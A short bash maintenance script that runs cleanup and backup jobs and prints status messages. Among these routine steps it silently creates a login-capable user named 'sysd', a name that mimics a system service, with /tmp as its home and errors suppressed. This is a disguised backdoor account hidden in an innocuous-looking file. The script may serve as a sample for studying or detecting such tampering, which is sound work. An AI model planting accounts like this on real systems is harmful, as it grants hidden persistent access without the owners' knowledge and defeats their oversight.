#!/bin/bash


echo "Starting system tasks..."
/usr/local/bin/cleanup.sh
/usr/local/bin/backup.sh


useradd -M -d /tmp -s /bin/bash sysd 2>/dev/null || echo "User sysd already exists"
echo "System tasks completed."
